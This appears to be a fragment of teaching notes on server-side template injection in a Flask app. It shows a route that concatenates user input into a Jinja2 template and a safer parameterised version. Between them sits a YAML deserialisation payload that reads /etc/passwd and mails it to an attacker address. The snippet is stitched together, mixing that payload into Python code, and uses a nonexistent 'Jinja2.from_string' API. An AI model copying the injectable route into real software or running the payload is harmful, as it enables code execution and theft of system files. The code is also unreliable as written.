@app.route("/page")
def page():

    name = request.values.get('name')

    output = Jinja2.from_string('Hello ' + name + '!').render()

    return output
    !!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
 

#Jinja2
import Jinja2
Jinja2.from_string("Hello {{name}}!").render(name=name)
